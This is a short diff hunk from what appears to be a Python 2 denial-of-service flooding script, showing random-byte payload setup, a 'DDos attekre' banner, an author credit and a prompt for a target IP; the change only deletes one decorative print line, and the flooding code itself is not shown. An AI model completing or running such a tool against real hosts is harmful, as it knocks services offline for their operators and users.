@@ -20,7 +20,6 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos attekre")
 print
-print "🄿🅈🄰🄴 🅂🄾🄽🄴 🄷🄼🄾🄾"
 print "Auto :Pyae Sone Hmoo"
 print
 ip = raw_input("Target IP : ")
